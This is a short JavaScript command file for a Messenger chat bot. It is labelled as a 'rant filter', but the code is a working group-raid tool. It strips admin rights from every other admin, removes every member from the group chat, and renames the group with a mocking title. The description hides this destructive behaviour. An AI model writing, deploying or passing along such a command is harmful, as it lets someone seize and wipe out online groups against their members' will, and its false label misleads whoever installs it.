module.exports.config = {
	name: "rant",
	version: "1.0.0", 
	hasPermssion: 2,
	credits: "Deku",
	description: "Filter rant vip pro version",
	commandCategory: "Admin", 
	usages: "", 
	cooldowns: 0,
};
 
module.exports.run = async function({ api, event }) {
	var info = await api.getThreadInfo(event.threadID);
	if (!info.adminIDs.some(item => item.id == api.getCurrentUserID())) return api.sendMessage('Admin the bot first this command is admin use only', event.threadID, event.messageID);
		var idtv = (await api.getThreadInfo(event.threadID)).participantIDs;
		var idad = (await api.getThreadInfo(event.threadID)).adminIDs;
        var a = []
        for(let ids of idad) a.push(ids.id);
        a.splice(a.indexOf(api.getCurrentUserID()), 1);
        for (let idqtv of a) {	
        api.changeAdminStatus(event.threadID, idqtv, false)
        }
		idtv.splice(idtv.indexOf(api.getCurrentUserID()), 1);
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        };
		for (let idall of idtv) {	
        await delay(0)
        api.removeUserFromGroup(idall,event.threadID)
		}			
		api.setTitle("nirakk lang ng bot HAHAHA", event.threadID);
          }